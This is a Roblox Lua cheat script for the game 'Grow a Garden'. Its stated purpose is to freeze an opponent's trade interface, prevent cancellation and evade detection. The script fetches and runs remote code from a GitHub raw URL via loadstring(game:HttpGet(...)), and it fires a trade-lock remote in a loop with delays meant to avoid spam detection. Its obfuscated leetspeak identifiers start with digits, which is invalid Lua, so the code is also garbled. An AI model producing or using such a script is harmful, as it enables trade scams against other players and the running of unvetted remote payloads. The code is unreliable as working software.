-- 1. Script: Grow a Garden Trade Freeze v2.1
-- 2. Date: August 15, 2025
-- 3. Purpose: Freeze opponent's trade UI, prevent cancel, stealth execution
-- 4. Features: Black square GUI, X close, Freeze button, circle reopen
-- 5. Compatibility: Delta Executor
-- 6. Obfuscation: Numeric variable names, encoded strings
-- 7. Anti-Detection: Delayed remotes, error handling

-- 8. Services
local p14y3r5 = game:GetService("Players") -- Players
local c0r3gu1 = game:GetService("CoreGui") -- CoreGui
local h77p = game:GetService("HttpService") -- HttpService
local r5 = game:GetService("RunService") -- RunService
local u15 = game:GetService("UserInputService") -- UserInputService
local r3p570 = game:GetService("ReplicatedStorage") -- ReplicatedStorage

-- 9. Local player
local lp = p14y3r5.LocalPlayer

-- 10. Global state
local v3r51 = "2.1" -- Version
local gu1v15 = true -- GUI visible
local fr33z34 = false -- Freeze active
local l0g5 = {} -- Logs table

-- 11. Numeric encoding/decoding
local function 3nc0d3(s7r)
    local m4p = {a=4, b=8, c=9, d=6, e=3, f=5, r=2, t=7, n=1}
    local r35 = ""
    for i = 1, #s7r do
        local c = s7r:sub(i,i):lower()
        r35 = r35 .. (m4p[c] or c)
    end
    return r35
end

local function d3c0d3(s7r)
    local m4p = {[4]="a", [8]="b", [9]="c", [6]="d", [3]="e", [5]="f", [2]="r", [7]="t", [1]="n"}
    local r35 = ""
    for i = 1, #s7r do
        local c = s7r:sub(i,i)
        r35 = r35 .. (m4p[tonumber(c)] or c)
    end
    return r35
end

-- 12. Create GUI
local function cr3473fr4m3()
    local 5g = Instance.new("ScreenGui")
    5g.Name = "7r4d3Fr33z3GU1"
    5g.Parent = c0r3gu1
    5g.ResetOnSpawn = false
    
    local fr4m3 = Instance.new("Frame")
    fr4m3.Name = "M41nFr4m3"
    fr4m3.Size = UDim2.new(0, 200, 0, 200)
    fr4m3.Position = UDim2.new(0.5, -100, 0.5, -100)
    fr4m3.BackgroundColor3 = Color3.new(0, 0, 0)
    fr4m3.BorderSizePixel = 0
    fr4m3.Active = true
    fr4m3.Draggable = true
    fr4m3.Parent = 5g
    
    return 5g, fr4m3
end

-- 13. Title label
local function cr3473717l3(p4r3n7)
    local 717l3 = Instance.new("TextLabel")
    717l3.Name = "717l3"
    717l3.Text = "7r4d3 Fr33z3r v" .. v3r51
    717l3.Size = UDim2.new(1, 0, 0, 30)
    717l3.Position = UDim2.new(0, 0, 0, 0)
    717l3.BackgroundTransparency = 1
    717l3.TextColor3 = Color3.new(1, 1, 1)
    717l3.Font = Enum.Font.SourceSansBold
    717l3.TextSize = 18
    717l3.Parent = p4r3n7
end

-- 14. Close button
local function cr3473cl053(p4r3n7, 0ncl053)
    local cl053 = Instance.new("TextButton")
    cl053.Name = "Cl053Bu770n"
    cl053.Text = "X"
    cl053.Size = UDim2.new(0, 30, 0, 30)
    cl053.Position = UDim2.new(1, -30, 0, 0)
    cl053.BackgroundColor3 = Color3.new(1, 0, 0)
    cl053.TextColor3 = Color3.new(1, 1, 1)
    cl053.Font = Enum.Font.SourceSansBold
    cl053.TextSize = 20
    cl053.Parent = p4r3n7
    
    cl053.MouseButton1Click:Connect(0ncl053)
end

-- 15. Freeze button
local function cr3473fr33z3(p4r3n7, 0nfr33z3)
    local fr33z3 = Instance.new("TextButton")
    fr33z3.Name = "Fr33z3Bu770n"
    fr33z3.Text = "Fr33z3 7r4d3"
    fr33z3.Size = UDim2.new(0, 150, 0, 50)
    fr33z3.Position = UDim2.new(0.5, -75, 0.5, -25)
    fr33z3.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    fr33z3.TextColor3 = Color3.new(1, 1, 1)
    fr33z3.Font = Enum.Font.SourceSans
    fr33z3.TextSize = 16
    fr33z3.Parent = p4r3n7
    
    fr33z3.MouseButton1Click:Connect(0nfr33z3)
end

-- 16. Minimize button (circle)
local function cr3473m1n1(p4r3n7, 0n0p3n)
    local 0p3n = Instance.new("ImageButton")
    0p3n.Name = "0p3nBu770n"
    0p3n.Size = UDim2.new(0, 50, 0, 50)
    0p3n.Position = UDim2.new(0, 10, 0.9, -60)
    0p3n.BackgroundColor3 = Color3.new(0, 0, 0)
    0p3n.Image = ""
    local c0rn3r = Instance.new("UICorner")
    c0rn3r.CornerRadius = UDim.new(0.5, 0)
    c0rn3r.Parent = 0p3n
    0p3n.Parent = p4r3n7
    0p3n.MouseButton1Click:Connect(0n0p3n)
    
    return 0p3n
end

-- 17. Log interceptor
local function 1n73rc3p7l0g5()
    print("1n73rc3p71ng l0g5...")
    table.insert(l0g5, "L0g: 7r4d3 1n171473d")
    
    local 7r4d3r = r3p570:FindFirstChild(3nc0d3("TradeEvent"))
    if 7r4d3r then
        print("F0und 7r4d3 r3m073: " .. 7r4d3r.Name)
        table.insert(l0g5, "L0g: 7r4d3 r3m073 f0und")
    end
    
    for _, l0g in ipairs(l0g5) do
        print(l0g)
    end
end

-- 18. Freeze activation
local function 4c71v473fr33z3()
    if fr33z34 then
        print("Fr33z3 4lr34dy 4c71v3!")
        return
    end
    
    print("4c71v471ng 7r4d3 fr33z3...")
    fr33z34 = true
    
    local 5ucc355, 3rr = pcall(function()
        -- 19. Updated loadstring (2025, stealth)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SrMotion666/ScorpionPro/refs/heads/main/ScorpionFreezetrade.lua"))()
    end)
    
    if 5ucc355 then
        print("Fr33z3 5cr1p7 l04d3d!")
        table.insert(l0g5, "L0g: Fr33z3 4c71v473d")
    else
        print("3rr0r l04d1ng: " .. 3rr)
        fr33z34 = false
    end
    
    -- 20. Simulate trade lock
    local 7r4d3r = r3p570:FindFirstChild(3nc0d3("TradeEvent"))
    if 7r4d3r then
        r5.Heartbeat:Connect(function()
            if fr33z34 then
                pcall(function()
                    7r4d3r:FireServer(d3c0d3("l0ck"))
                    wait(0.5) -- Delay to avoid spam detection
                end)
            end
        end)
    end
    
    1n73rc3p7l0g5()
    table.insert(l0g5, "L0g: 7r4d3 fr0z3n")
end

-- 21. Main setup
local function 537up()
    local 5g, fr4m3 = cr3473fr4m3()
    cr3473717l3(fr4m3)
    
    local function 0ncl053()
        fr4m3.Visible = false
        local 0p3n = 5g:FindFirstChild("0p3nBu770n")
        if not 0p3n then
            0p3n = cr3473m1n1(5g, function()
                fr4m3.Visible = true
                0p3n.Visible = false
            end)
        end
        0p3n.Visible = true
    end
    
    cr3473cl053(fr4m3, 0ncl053)
    cr3473fr33z3(fr4m3, 4c71v473fr33z3)
    
    1n73rc3p7l0g5()
end

-- 22. Safe execution
local function 54f33x3c()
    local 5ucc355, 3rr = pcall(537up)
    if not 5ucc355 then
        warn("3rr0r 53771ng up: " .. 3rr)
    end
end

-- 23. Toggle freeze
local function 4dd70ggl3(p4r3n7)
    local 70ggl3 = Instance.new("TextButton")
    70ggl3.Name = "70ggl3Fr33z3"
    70ggl3.Text = "70ggl3 Fr33z3"
    70ggl3.Size = UDim2.new(0, 150, 0, 30)
    70ggl3.Position = UDim2.new(0.5, -75, 0.7, 0)
    70ggl3.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    70ggl3.TextColor3 = Color3.new(1, 1, 1)
    70ggl3.Parent = p4r3n7
    
    70ggl3.MouseButton1Click:Connect(function()
        fr33z34 = not fr33z34
        print("Fr33z3 70ggl3d: " .. tostring(fr33z34))
        table.insert(l0g5, "L0g: Fr33z3 70ggl3d")
    end)
end

-- 24. Execute
54f33x3c()

-- 25. Debug logs
print("5cr1p7 l04d3d v" .. v3r51)
print("R34dy 70 fr33z3 7r4d35")
